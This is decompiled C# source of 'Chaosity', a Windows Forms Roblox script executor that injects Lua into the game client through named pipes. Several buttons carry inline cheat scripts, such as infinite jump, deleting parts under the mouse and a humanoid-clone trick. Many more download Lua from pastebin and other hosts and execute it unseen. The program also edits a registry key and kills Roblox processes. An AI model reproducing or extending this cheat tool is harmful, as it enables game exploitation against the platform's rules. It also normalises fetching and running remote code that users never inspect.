// Decompiled with JetBrains decompiler
// Type: Chaosity.OMGGameHubMain
// Assembly: Chaosity, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 8FD1C12D-B5CF-4C0B-B451-47DE735C992C
// Assembly location: C:\Users\povar\Desktop\Chaosity (Exploit)\ChaosityExploit.exe

using DiscordRpcDemo;
using FlatUI;
using Microsoft.Win32;
using ModuleAPI;
using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;

namespace Chaosity
{
  public class OMGGameHubMain : Form
  {
    private Module api;
    private DiscordRpc.RichPresence presence;
    private DiscordRpc.EventHandlers handlers;
    private WebClient webClient;
    private OpenFileDialog open;
    private Module module;
    private IContainer components;
    private IContainer icontainer_0;
    private FormSkin From1;
    private FlatTabControl flatTabControl2;
    private TabPage tabPage27;
    private TabPage tabPage30;
    private FlatButton flatButton63;
    private TabPage tabPage31;
    private FlatButton flatButton85;
    private TabPage tabPage32;
    private FlatButton flatButton88;
    private TabPage tabPage33;
    private FlatButton flatButton91;
    private PictureBox pictureBox46;
    private TabPage tabPage36;
    private TabPage tabPage38;
    private FlatButton flatButton106;
    private PictureBox pictureBox58;
    private FlatButton flatButton107;
    private FlatButton flatButton110;
    private PictureBox pictureBox60;
    private FlatButton flatButton111;
    private TabPage tabPage45;
    private FlatButton flatButton128;
    private PictureBox pictureBox70;
    private FlatButton flatButton129;
    private TabPage tabPage48;
    private FlatButton flatButton18;
    private PictureBox pictureBox78;
    private FlatButton flatButton21;
    private TabPage tabPage51;
    private FlatButton flatButton12;
    private PictureBox pictureBox17;
    private FlatButton flatButton64;
    private TabPage tabPage52;
    private TabPage tabPage58;
    private FlatButton flatButton150;
    private PictureBox pictureBox88;
    private FlatButton flatButton151;
    private FlatButton flatButton162;
    private PictureBox pictureBox94;
    private FlatButton flatButton163;
    private TabPage tabPage61;
    private TabPage tabPage64;
    private TabPage tabPage65;
    private TabPage tabPage66;
    private TabPage tabPage67;
    private FlatButton flatButton32;
    private PictureBox pictureBox19;
    private FlatButton flatButton66;
    private FlatButton flatButton178;
    private PictureBox pictureBox106;
    private FlatButton flatButton179;
    private FlatButton flatButton180;
    private PictureBox pictureBox107;
    private FlatButton flatButton181;
    private FlatButton flatButton182;
    private PictureBox pictureBox108;
    private FlatButton flatButton183;
    private FlatButton flatButton184;
    private PictureBox pictureBox109;
    private FlatButton flatButton185;
    private TabPage tabPage70;
    private TabPage tabPage72;
    private TabPage tabPage74;
    private FlatButton flatButton197;
    private PictureBox pictureBox119;
    private FlatButton flatButton198;
    private FlatButton flatButton201;
    private PictureBox pictureBox121;
    private FlatButton flatButton202;
    private FlatButton flatButton205;
    private PictureBox pictureBox123;
    private RichTextBox richTextBox59;
    private FlatButton flatButton206;
    private TabPage tabPage76;
    private FlatButton flatButton218;
    private PictureBox pictureBox134;
    private FlatButton flatButton219;
    private TabPage tabPage77;
    private TabPage tabPage79;
    private TabPage tabPage80;
    private TabPage tabPage81;
    private TabPage tabPage82;
    private TabPage tabPage83;
    private FlatButton flatButton220;
    private PictureBox pictureBox135;
    private FlatButton flatButton221;
    private FlatButton flatButton224;
    private PictureBox pictureBox137;
    private FlatButton flatButton225;
    private FlatButton flatButton226;
    private PictureBox pictureBox138;
    private FlatButton flatButton227;
    private FlatButton flatButton228;
    private PictureBox pictureBox139;
    private FlatButton flatButton229;
    private FlatButton flatButton230;
    private PictureBox pictureBox140;
    private FlatButton flatButton231;
    private FlatButton flatButton232;
    private PictureBox pictureBox141;
    private FlatButton flatButton233;
    private FlatButton flatButton60;
    private TabPage tabPage86;
    private FlatButton flatButton244;
    private PictureBox pictureBox151;
    private FlatButton flatButton245;
    private TabPage tabPage88;
    private FlatButton flatButton248;
    private PictureBox pictureBox153;
    private FlatButton flatButton249;
    private TabPage tabPage89;
    private FlatButton flatButton250;
    private PictureBox pictureBox154;
    private RichTextBox richTextBox67;
    private FlatButton flatButton251;
    private TabPage tabPage90;
    private FlatButton flatButton252;
    private PictureBox pictureBox155;
    private FlatButton flatButton253;
    private TabPage tabPage91;
    private FlatButton flatButton254;
    private PictureBox pictureBox156;
    private FlatButton flatButton255;
    private TabPage tabPage93;
    private FlatButton flatButton258;
    private PictureBox pictureBox158;
    private TabPage tabPage94;
    private FlatButton flatButton31;
    private PictureBox pictureBox25;
    private TabPage tabPage96;
    private TabPage tabPage99;
    private FlatButton flatButton268;
    private PictureBox pictureBox167;
    private RichTextBox richTextBox68;
    private FlatButton flatButton269;
    private FlatButton flatButton274;
    private PictureBox pictureBox170;
    private FlatButton flatButton275;
    private FlatButton flatButton276;
    private Label label3;
    private FlatButton flatButton277;
    private TabPage tabPage103;
    private TabPage tabPage104;
    private TabPage tabPage105;
    private TabPage tabPage107;
    private TabPage tabPage108;
    private FlatButton flatButton292;
    private PictureBox pictureBox182;
    private FlatButton flatButton293;
    private FlatButton flatButton294;
    private PictureBox pictureBox183;
    private RichTextBox richTextBox75;
    private FlatButton flatButton295;
    private FlatButton flatButton296;
    private PictureBox pictureBox184;
    private RichTextBox richTextBox76;
    private FlatButton flatButton297;
    private FlatButton flatButton300;
    private PictureBox pictureBox186;
    private FlatButton flatButton301;
    private FlatButton flatButton302;
    private PictureBox pictureBox187;
    private FlatButton flatButton303;
    private FlatButton flatButton304;
    private TabPage tabPage110;
    private FlatButton flatButton314;
    private PictureBox pictureBox196;
    private FlatButton flatButton315;
    private TabPage tabPage111;
    private TabPage tabPage112;
    private TabPage tabPage113;
    private FlatButton flatButton316;
    private PictureBox pictureBox197;
    private FlatButton flatButton317;
    private FlatButton flatButton318;
    private PictureBox pictureBox198;
    private FlatButton flatButton319;
    private FlatButton flatButton320;
    private PictureBox pictureBox199;
    private FlatButton flatButton321;
    private RichTextBox richTextBox6;
    private TabPage tabPage117;
    private FlatButton flatButton334;
    private PictureBox pictureBox210;
    private TabPage tabPage119;
    private FlatButton flatButton338;
    private PictureBox pictureBox212;
    private FlatButton flatButton339;
    private TabPage tabPage120;
    private FlatButton flatButton340;
    private PictureBox pictureBox213;
    private FlatButton flatButton341;
    private TabPage tabPage122;
    private TabPage tabPage124;
    private FlatButton flatButton344;
    private PictureBox pictureBox215;
    private RichTextBox richTextBox84;
    private FlatButton flatButton345;
    private FlatButton flatButton348;
    private PictureBox pictureBox217;
    private RichTextBox richTextBox86;
    private FlatButton flatButton349;
    private TabPage tabPage125;
    private FlatButton flatButton350;
    private PictureBox pictureBox218;
    private RichTextBox richTextBox87;
    private FlatButton flatButton351;
    private TabPage tabPage126;
    private FlatButton flatButton358;
    private PictureBox pictureBox226;
    private FlatButton flatButton359;
    private TabPage tabPage127;
    private TabPage tabPage128;
    private TabPage tabPage129;
    private TabPage tabPage130;
    private TabPage tabPage132;
    private FlatButton flatButton360;
    private PictureBox pictureBox227;
    private FlatButton flatButton361;
    private FlatButton flatButton362;
    private PictureBox pictureBox228;
    private FlatButton flatButton363;
    private FlatButton flatButton364;
    private PictureBox pictureBox229;
    private FlatButton flatButton365;
    private FlatButton flatButton366;
    private PictureBox pictureBox230;
    private FlatButton flatButton367;
    private RichTextBox richTextBox101;
    private FlatButton flatButton370;
    private PictureBox pictureBox232;
    private RichTextBox richTextBox88;
    private FlatButton flatButton371;
    private TabPage tabPage136;
    private TabPage tabPage137;
    private FlatButton flatButton385;
    private PictureBox pictureBox243;
    private RichTextBox richTextBox91;
    private FlatButton flatButton386;
    private FlatButton flatButton387;
    private PictureBox pictureBox244;
    private FlatButton flatButton388;
    private TabPage tabPage140;
    private TabPage tabPage141;
    private TabPage tabPage142;
    private FlatButton flatButton393;
    private PictureBox pictureBox247;
    private RichTextBox richTextBox94;
    private FlatButton flatButton394;
    private FlatButton flatButton395;
    private PictureBox pictureBox248;
    private FlatButton flatButton396;
    private FlatButton flatButton397;
    private PictureBox pictureBox249;
    private FlatButton flatButton398;
    private TabPage tabPage143;
    private FlatButton flatButton405;
    private PictureBox pictureBox257;
    private FlatButton flatButton406;
    private TabPage tabPage144;
    private TabPage tabPage145;
    private TabPage tabPage146;
    private TabPage tabPage147;
    private TabPage tabPage148;
    private FlatButton flatButton407;
    private PictureBox pictureBox258;
    private FlatButton flatButton408;
    private FlatButton flatButton409;
    private PictureBox pictureBox259;
    private FlatButton flatButton410;
    private FlatButton flatButton411;
    private PictureBox pictureBox260;
    private FlatButton flatButton412;
    private FlatButton flatButton413;
    private PictureBox pictureBox261;
    private FlatButton flatButton414;
    private FlatButton flatButton415;
    private PictureBox pictureBox262;
    private FlatButton flatButton416;
    private FlatButton flatButton417;
    private FlatButton flatButton418;
    private TabPage tabPage149;
    private FlatButton flatButton419;
    private FlatButton flatButton420;
    private PictureBox pictureBox263;
    private RichTextBox richTextBox12;
    private FlatButton flatButton427;
    private TabPage tabPage150;
    private FlatButton flatButton428;
    private PictureBox pictureBox271;
    private RichTextBox richTextBox96;
    private FlatButton flatButton429;
    private TabPage tabPage151;
    private TabPage tabPage152;
    private TabPage tabPage153;
    private TabPage tabPage154;
    private FlatButton flatButton430;
    private PictureBox pictureBox272;
    private RichTextBox richTextBox97;
    private FlatButton flatButton431;
    private TabPage tabPage155;
    private FlatButton flatButton432;
    private PictureBox pictureBox273;
    private FlatButton flatButton433;
    private TabPage tabPage156;
    private FlatButton flatButton434;
    private PictureBox pictureBox274;
    private RichTextBox richTextBox98;
    private FlatButton flatButton435;
    private FlatButton flatButton436;
    private PictureBox pictureBox275;
    private RichTextBox richTextBox99;
    private FlatButton flatButton437;
    private FlatButton flatButton438;
    private PictureBox pictureBox276;
    private RichTextBox richTextBox100;
    private FlatButton flatButton439;
    private FlatButton flatButton440;
    private PictureBox pictureBox277;
    private RichTextBox richTextBox102;
    private FlatButton flatButton441;
    private RichTextBox richTextBox103;
    private FlatButton flatButton442;
    private TabPage tabPage158;
    private FlatButton flatButton56;
    private PictureBox pictureBox33;
    private FlatButton flatButton76;
    private RichTextBox richTextBox105;
    private FlatButton flatButton446;
    private TabPage tabPage159;
    private FlatButton flatButton455;
    private PictureBox pictureBox287;
    private FlatButton flatButton456;
    private TabPage tabPage160;
    private TabPage tabPage161;
    private TabPage tabPage162;
    private FlatButton flatButton457;
    private PictureBox pictureBox288;
    private FlatButton flatButton458;
    private FlatButton flatButton459;
    private PictureBox pictureBox289;
    private FlatButton flatButton460;
    private FlatButton flatButton461;
    private PictureBox pictureBox290;
    private FlatButton flatButton462;
    private TabPage tabPage163;
    private FlatButton flatButton463;
    private PictureBox pictureBox291;
    private RichTextBox richTextBox106;
    private FlatButton flatButton464;
    private TabPage tabPage164;
    private FlatButton flatButton471;
    private PictureBox pictureBox299;
    private FlatButton flatButton472;
    private TabPage tabPage165;
    private TabPage tabPage166;
    private TabPage tabPage167;
    private TabPage tabPage168;
    private TabPage tabPage170;
    private FlatButton flatButton473;
    private PictureBox pictureBox300;
    private FlatButton flatButton474;
    private FlatButton flatButton475;
    private PictureBox pictureBox301;
    private FlatButton flatButton476;
    private FlatButton flatButton477;
    private PictureBox pictureBox302;
    private FlatButton flatButton478;
    private FlatButton flatButton479;
    private PictureBox pictureBox303;
    private FlatButton flatButton480;
    private FlatButton flatButton483;
    private PictureBox pictureBox305;
    private FlatButton flatButton484;
    private FlatButton flatButton487;
    private TabPage Main;
    private Button button40;
    private Button button6;
    private Button button3;
    private Button button2;
    private Button button1;
    private Button button18;
    private CheckBox cb2;
    private Button button4;
    private Button button9;
    private Button button8;
    private Button button7;
    private Button button5;
    private WebBrowser webBrowser1;
    private TabPage Executor;
    private CheckBox MultipleROBLOX;
    private Button button10;

    [DllImport("Gdi32.dll")]
    private static extern IntPtr CreateRoundRectRgn(
      int int_0,
      int int_1,
      int int_2,
      int int_3,
      int int_4,
      int int_5);

    public OMGGameHubMain()
    {
      OpenFileDialog openFileDialog = new OpenFileDialog();
      openFileDialog.Filter = "Lua Script (*.txt)|*.txt|Lua Script (*.lua)|*.lua";
      openFileDialog.FilterIndex = 1;
      openFileDialog.Title = "Open Script";
      this.open = openFileDialog;
      this.module = new Module();
      this.components = (IContainer) null;
      this.icontainer_0 = (IContainer) null;
      // ISSUE: explicit constructor call
      this.InitializeComponent();
      this.handlers = new DiscordRpc.EventHandlers();
      DiscordRpc.Initialize("690288190283972619", ref this.handlers, true, (string) null);
      this.presence.state = "Project: Chaosity";
      this.presence.details = "Download Chaosity!";
      this.presence.startTimestamp = 0L;
      this.presence.largeImageKey = "chaosity_pfp";
      this.presence.largeImageText = "Project: Chaosity";
      this.presence.smallImageKey = "chaosity_pfp";
      this.presence.smallImageText = "Project: Chaosity";
      DiscordRpc.UpdatePresence(ref this.presence);
      this.TopMost = true;
      this.FormBorderStyle = FormBorderStyle.None;
      this.Region = Region.FromHrgn(OMGGameHubMain.CreateRoundRectRgn(0, 0, this.Width, this.Height, 20, 20));
      try
      {
        RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Internet Explorer\\Main\\FeatureControl\\FEATURE_BROWSER_EMULATION", true);
        string friendlyName = AppDomain.CurrentDomain.FriendlyName;
        if (registryKey.GetValue(friendlyName) == null)
          registryKey.SetValue(friendlyName, (object) 11001, RegistryValueKind.DWord);
      }
      catch (Exception ex)
      {
      }
      this.webBrowser1.Url = new Uri(string.Format("file:///{0}/Monaco/Monaco.html", (object) Directory.GetCurrentDirectory()));
    }

    private bool universalBypassInstalled()
    {
      return Directory.Exists(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "/Google/Chrome/User Data/Default/Extensions/aihomhdbhpnpmcnnbckjjcebjoikpihj");
    }

    private void From1_Click(object sender, EventArgs e)
    {
    }

    private void method_0(string string_0)
    {
      NamedPipes.LuaPipe(string_0);
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/0V0gQ5qe"));
    }

    private void flatButton13_Click(object sender, EventArgs e)
    {
    }

    private void flatButton14_Click(object sender, EventArgs e)
    {
    }

    private void flatButton15_Click(object sender, EventArgs e)
    {
    }

    private void method_1(object sender, EventArgs e)
    {
    }

    private void flatButton17_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("local Plr = game:GetService('Players').LocalPlayer local Mouse = Plr:GetMouse() Mouse.Button1Down:connect(function() if not game:GetService('UserInputService'):IsKeyDown(Enum.KeyCode.LeftAlt) then return end if not Mouse.Target then return end Mouse.Target:Destroy() end)");
    }

    private void method_2(object sender, EventArgs e)
    {
    }

    private void flatButton19_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("game.Players.LocalPlayer.Character.Humanoid.Name = 1\nlocal l = game.Players.LocalPlayer.Character['1']:Clone()\nl.Parent = game.Players.LocalPlayer.Character\nl.Name = 'Humanoid'\nwait(0.1)\ngame.Players.LocalPlayer.Character['1']:Destroy()\ngame.Workspace.CurrentCamera.CameraSubject = game.Players.LocalPlayer.Character\ngame.Players.LocalPlayer.Character.Animate.Disabled = true\nwait(0.1)\ngame.Players.LocalPlayer.Character.Animate.Disabled = false\ngame.Players.LocalPlayer.Character.Humanoid.DisplayDistanceType = 'None'");
    }

    private void flatButton20_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("local InfiniteJumpEnabled = true\ngame:GetService('UserInputService').JumpRequest:connect(function()\nif InfiniteJumpEnabled then\ngame:GetService'Players'.LocalPlayer.Character:FindFirstChildOfClass'Humanoid':ChangeState('Jumping')\nend\nend)");
    }

    private void flatButton22_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("local player = game:GetService('Players').LocalPlayer local mouse = player:GetMouse() mouse.KeyDown:connect(function(key) if key:lower() == 'r' or key:upper() == 'R' then for i = 1,15 do wait(0.05) x = Instance.new('Part',game:GetService('Workspace')) x.Size = Vector3.new(15,0.1,15) x.TopSurface = 'Smooth' x.Anchored = true x.BrickColor = BrickColor.random()  x.CFrame = CFrame.new(player.Character.UpperTorso.Position) + Vector3.new(0,-3,0) game.Debris:AddItem(x, 3) end end end)");
    }

    private void flatButton6_Click(object sender, EventArgs e)
    {
      try
      {
        foreach (Process process in Process.GetProcessesByName("RobloxPlayerBeta"))
          process.Kill();
      }
      catch
      {
      }
    }

    private void method_3(object sender, EventArgs e)
    {
      Process.Start("https://www.youtube.com/channel/UCdjNVYF5RRtFVwWIK34L88A");
    }

    private void flatButton8_Click(object sender, EventArgs e)
    {
      Process.Start("https://www.youtube.com/channel/UC1-EmBzlsNj6ka0hAKBrWYg");
    }

    private void method_4(object sender, EventArgs e)
    {
    }

    private void method_6(object sender, EventArgs e)
    {
    }

    private void method_7(object sender, EventArgs e)
    {
    }

    private void method_8(object sender, EventArgs e)
    {
    }

    private void method_9(object sender, EventArgs e)
    {
    }

    private void method_10(object sender, EventArgs e)
    {
    }

    private void method_11(object sender, EventArgs e)
    {
    }

    private void method_12(object sender, EventArgs e)
    {
    }

    private void method_13(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("print'yeet'");
    }

    private void method_14(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("print'boi'");
    }

    private void flatTabControl2_SelectedIndexChanged(object sender, EventArgs e)
    {
    }

    private void flatMini1_Click(object sender, EventArgs e)
    {
    }

    private void flatClose1_Click(object sender, EventArgs e)
    {
    }

    private void ScriptBox1_Load(object sender, EventArgs e)
    {
    }

    private void tabPage1_Click(object sender, EventArgs e)
    {
    }

    private void flatCheckBox3_CheckedChanged(object object_0)
    {
    }

    private void tabPage2_Click(object sender, EventArgs e)
    {
    }

    private void tabPage4_Click(object sender, EventArgs e)
    {
    }

    private void flatTabControl1_SelectedIndexChanged(object sender, EventArgs e)
    {
    }

    private void method_15(object sender, EventArgs e)
    {
    }

    private void tabPage5_Click(object sender, EventArgs e)
    {
    }

    private void method_16(object sender, EventArgs e)
    {
    }

    private void tabPage6_Click(object sender, EventArgs e)
    {
    }

    private void method_17(object sender, EventArgs e)
    {
    }

    private void tabPage7_Click(object sender, EventArgs e)
    {
    }

    private void method_18(object sender, EventArgs e)
    {
    }

    private void tabPage9_Click(object sender, EventArgs e)
    {
    }

    private void method_19(object sender, EventArgs e)
    {
    }

    private void tabPage10_Click(object sender, EventArgs e)
    {
    }

    private void method_20(object sender, EventArgs e)
    {
    }

    private void tabPage11_Click(object sender, EventArgs e)
    {
    }

    private void method_21(object sender, EventArgs e)
    {
    }

    private void tabPage12_Click(object sender, EventArgs e)
    {
    }

    private void method_22(object sender, EventArgs e)
    {
    }

    private void tabPage8_Click(object sender, EventArgs e)
    {
    }

    private void flatTextBox2_TextChanged(object sender, EventArgs e)
    {
    }

    private void flatTextBox1_TextChanged(object sender, EventArgs e)
    {
    }

    private void tabPage3_Click(object sender, EventArgs e)
    {
    }

    private void flatLabel3_Click(object sender, EventArgs e)
    {
    }

    private void flatLabel2_Click(object sender, EventArgs e)
    {
    }

    private void flatLabel1_Click(object sender, EventArgs e)
    {
    }

    private void method_23(object sender, EventArgs e)
    {
    }

    private void method_24(object sender, EventArgs e)
    {
    }

    private void method_25(object sender, EventArgs e)
    {
    }

    private void method_26(object sender, EventArgs e)
    {
    }

    private void method_27(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/154RJ1mv"));
    }

    private void method_28(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.richTextBox6.Text);
    }

    private void method_29(object sender, EventArgs e)
    {
    }

    private void pictureBox11_Click(object sender, EventArgs e)
    {
    }

    private void method_30(object sender, EventArgs e)
    {
    }

    private void pictureBox2_Click(object sender, EventArgs e)
    {
    }

    private void pictureBox6_Click(object sender, EventArgs e)
    {
    }

    private void pictureBox5_Click(object sender, EventArgs e)
    {
    }

    private void tabPage18_Click(object sender, EventArgs e)
    {
    }

    private void pictureBox4_Click(object sender, EventArgs e)
    {
    }

    private void tabPage13_Click(object sender, EventArgs e)
    {
    }

    private void tabPage16_Click(object sender, EventArgs e)
    {
    }

    private void tabPage17_Click(object sender, EventArgs e)
    {
    }

    private void tabPage14_Click(object sender, EventArgs e)
    {
    }

    private void tabPage15_Click(object sender, EventArgs e)
    {
    }

    private void pictureBox8_Click(object sender, EventArgs e)
    {
    }

    private void pictureBox12_Click(object sender, EventArgs e)
    {
    }

    private void pictureBox21_Click(object sender, EventArgs e)
    {
    }

    private void method_31(object sender, EventArgs e)
    {
    }

    private void pictureBox14_Click(object sender, EventArgs e)
    {
    }

    private void pictureBox23_Click(object sender, EventArgs e)
    {
    }

    private void method_32(object sender, EventArgs e)
    {
    }

    private void pictureBox22_Click(object sender, EventArgs e)
    {
    }

    private void pictureBox3_Click(object sender, EventArgs e)
    {
    }

    private void method_33(object sender, EventArgs e)
    {
    }

    private void pictureBox16_Click(object sender, EventArgs e)
    {
    }

    private void pictureBox9_Click(object sender, EventArgs e)
    {
    }

    private void pictureBox7_Click(object sender, EventArgs e)
    {
    }

    private void pictureBox13_Click(object sender, EventArgs e)
    {
    }

    private void pictureBox1_Click(object sender, EventArgs e)
    {
    }

    private void pictureBox24_Click(object sender, EventArgs e)
    {
    }

    private void pictureBox10_Click(object sender, EventArgs e)
    {
    }

    private void pictureBox15_Click(object sender, EventArgs e)
    {
    }

    private void method_34(object sender, EventArgs e)
    {
    }

    private void method_35(object sender, EventArgs e)
    {
    }

    private void method_36(object sender, EventArgs e)
    {
    }

    private void method_37(object sender, EventArgs e)
    {
    }

    private void method_38(object sender, EventArgs e)
    {
    }

    private void method_39(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.richTextBox12.Text);
    }

    private void method_40(object sender, EventArgs e)
    {
    }

    private void method_41(object sender, EventArgs e)
    {
    }

    private void flatButton58_Click(object sender, EventArgs e)
    {
    }

    private void flatButton59_Click(object sender, EventArgs e)
    {
    }

    private void flatButton61_Click(object sender, EventArgs e)
    {
    }

    private void flatButton62_Click(object sender, EventArgs e)
    {
    }

    private void flatButton63_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/YCgygGXp"));
    }

    private void flatButton24_Click(object sender, EventArgs e)
    {
      this.flatTabControl2.SelectTab(this.tabPage93);
    }

    private void flatButton35_Click(object sender, EventArgs e)
    {
    }

    private void flatButton25_Click(object sender, EventArgs e)
    {
    }

    private void flatButton34_Click(object sender, EventArgs e)
    {
    }

    private void flatButton46_Click(object sender, EventArgs e)
    {
    }

    private void flatButton48_Click(object sender, EventArgs e)
    {
      this.flatTabControl2.SelectTab(this.tabPage94);
    }

    private void flatButton50_Click(object sender, EventArgs e)
    {
    }

    private void flatButton42_Click(object sender, EventArgs e)
    {
    }

    private void flatButton45_Click(object sender, EventArgs e)
    {
      this.flatTabControl2.SelectTab(this.tabPage125);
    }

    private void flatButton44_Click(object sender, EventArgs e)
    {
    }

    private void flatButton43_Click(object sender, EventArgs e)
    {
    }

    private void flatButton41_Click(object sender, EventArgs e)
    {
      this.flatTabControl2.SelectTab(this.tabPage149);
    }

    private void flatButton40_Click(object sender, EventArgs e)
    {
    }

    private void flatButton39_Click(object sender, EventArgs e)
    {
      this.flatTabControl2.SelectTab(this.tabPage163);
    }

    private void flatButton26_Click(object sender, EventArgs e)
    {
    }

    private void flatButton36_Click(object sender, EventArgs e)
    {
    }

    private void flatButton37_Click(object sender, EventArgs e)
    {
      this.flatTabControl2.SelectTab(this.tabPage27);
    }

    private void flatButton38_Click(object sender, EventArgs e)
    {
    }

    private void flatButton47_Click(object sender, EventArgs e)
    {
      this.flatTabControl2.SelectTab(this.tabPage30);
    }

    private void flatButton49_Click(object sender, EventArgs e)
    {
    }

    private void method_42(object sender, EventArgs e)
    {
    }

    private void method_43(object sender, EventArgs e)
    {
    }

    private void method_44(object sender, EventArgs e)
    {
    }

    private void method_45(object sender, EventArgs e)
    {
    }

    private void method_46(object sender, EventArgs e)
    {
    }

    private void method_47(object sender, EventArgs e)
    {
    }

    private void method_48(object sender, EventArgs e)
    {
    }

    private void method_49(object sender, EventArgs e)
    {
    }

    private void method_50(object sender, EventArgs e)
    {
    }

    private void method_51(object sender, EventArgs e)
    {
    }

    private void method_52(object sender, EventArgs e)
    {
    }

    private void method_53(object sender, EventArgs e)
    {
    }

    private void method_54(object sender, EventArgs e)
    {
    }

    private void method_55(object sender, EventArgs e)
    {
    }

    private void flatButton78_Click(object sender, EventArgs e)
    {
    }

    private void flatButton79_Click(object sender, EventArgs e)
    {
    }

    private void flatButton80_Click(object sender, EventArgs e)
    {
    }

    private void flatButton81_Click(object sender, EventArgs e)
    {
    }

    private void flatButton82_Click(object sender, EventArgs e)
    {
    }

    private void flatButton83_Click(object sender, EventArgs e)
    {
    }

    private void flatButton84_Click(object sender, EventArgs e)
    {
    }

    private void flatButton85_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/3aY721rD"));
    }

    private void flatButton7_Click(object sender, EventArgs e)
    {
      this.flatTabControl2.SelectTab(this.tabPage31);
    }

    private void flatButton87_Click(object sender, EventArgs e)
    {
    }

    private void flatButton88_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/9VjkFp38"));
    }

    private void flatButton89_Click(object sender, EventArgs e)
    {
    }

    private void flatButton86_Click(object sender, EventArgs e)
    {
      this.flatTabControl2.SelectTab(this.tabPage32);
    }

    private void flatButton91_Click(object sender, EventArgs e)
    {
    }

    private void flatButton92_Click(object sender, EventArgs e)
    {
    }

    private void flatButton90_Click(object sender, EventArgs e)
    {
      this.flatTabControl2.SelectTab(this.tabPage33);
    }

    private void flatButton94_Click(object sender, EventArgs e)
    {
    }

    private void flatButton95_Click(object sender, EventArgs e)
    {
    }

    private void flatButton93_Click(object sender, EventArgs e)
    {
    }

    private void flatButton104_Click(object sender, EventArgs e)
    {
    }

    private void flatButton106_Click(object sender, EventArgs e)
    {
    }

    private void flatButton108_Click(object sender, EventArgs e)
    {
    }

    private void flatButton110_Click(object sender, EventArgs e)
    {
    }

    private void flatButton112_Click(object sender, EventArgs e)
    {
    }

    private void pictureBox61_Click(object sender, EventArgs e)
    {
    }

    private void flatButton114_Click(object sender, EventArgs e)
    {
    }

    private void flatButton116_Click(object sender, EventArgs e)
    {
    }

    private void richTextBox25_TextChanged(object sender, EventArgs e)
    {
    }

    private void flatButton107_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/pSAefd2s"));
    }

    private void flatButton109_Click(object sender, EventArgs e)
    {
    }

    private void flatButton111_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://whitelistcheck.com/scripts/legoninja.lua"));
    }

    private void flatButton113_Click(object sender, EventArgs e)
    {
    }

    private void flatButton115_Click(object sender, EventArgs e)
    {
    }

    private void flatButton117_Click(object sender, EventArgs e)
    {
    }

    private void flatButton105_Click(object sender, EventArgs e)
    {
    }

    private void flatButton118_Click(object sender, EventArgs e)
    {
    }

    private void flatButton119_Click(object sender, EventArgs e)
    {
    }

    private void flatButton120_Click(object sender, EventArgs e)
    {
    }

    private void flatButton103_Click(object sender, EventArgs e)
    {
    }

    private void flatButton102_Click(object sender, EventArgs e)
    {
      this.flatTabControl2.SelectTab(this.tabPage36);
    }

    private void flatButton100_Click(object sender, EventArgs e)
    {
    }

    private void flatButton99_Click(object sender, EventArgs e)
    {
      this.flatTabControl2.SelectTab(this.tabPage38);
    }

    private void flatButton98_Click(object sender, EventArgs e)
    {
    }

    private void flatButton97_Click(object sender, EventArgs e)
    {
    }

    private void flatButton96_Click(object sender, EventArgs e)
    {
    }

    private void flatButton101_Click(object sender, EventArgs e)
    {
    }

    private void flatButton124_Click(object sender, EventArgs e)
    {
      this.flatTabControl2.SelectTab(this.tabPage38);
    }

    private void method_56(object sender, EventArgs e)
    {
    }

    private void flatButton127_Click(object sender, EventArgs e)
    {
    }

    private void flatButton126_Click(object sender, EventArgs e)
    {
    }

    private void flatButton129_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/Bptehkkz"));
    }

    private void flatButton128_Click(object sender, EventArgs e)
    {
    }

    private void flatButton131_Click(object sender, EventArgs e)
    {
    }

    private void flatButton130_Click(object sender, EventArgs e)
    {
    }

    private void flatButton123_Click(object sender, EventArgs e)
    {
    }

    private void flatButton122_Click(object sender, EventArgs e)
    {
      this.flatTabControl2.SelectTab(this.tabPage45);
    }

    private void flatButton121_Click(object sender, EventArgs e)
    {
    }

    private void flatButton134_Click(object sender, EventArgs e)
    {
    }

    private void flatButton133_Click(object sender, EventArgs e)
    {
    }

    private void flatButton135_Click(object sender, EventArgs e)
    {
    }

    private void flatButton132_Click(object sender, EventArgs e)
    {
    }

    private void flatButton138_Click(object sender, EventArgs e)
    {
    }

    private void flatButton139_Click(object sender, EventArgs e)
    {
    }

    private void flatButton137_Click(object sender, EventArgs e)
    {
    }

    private void flatButton136_Click(object sender, EventArgs e)
    {
    }

    private void flatButton21_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/i0kMntpj"));
    }

    private void flatButton18_Click(object sender, EventArgs e)
    {
    }

    private void flatButton16_Click(object sender, EventArgs e)
    {
      this.flatTabControl2.SelectTab(this.tabPage48);
    }

    private void method_57(object sender, EventArgs e)
    {
    }

    private void flatButton141_Click(object sender, EventArgs e)
    {
    }

    private void flatButton140_Click(object sender, EventArgs e)
    {
    }

    private void flatButton64_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/P6RDvNcB"));
    }

    private void flatButton12_Click(object sender, EventArgs e)
    {
    }

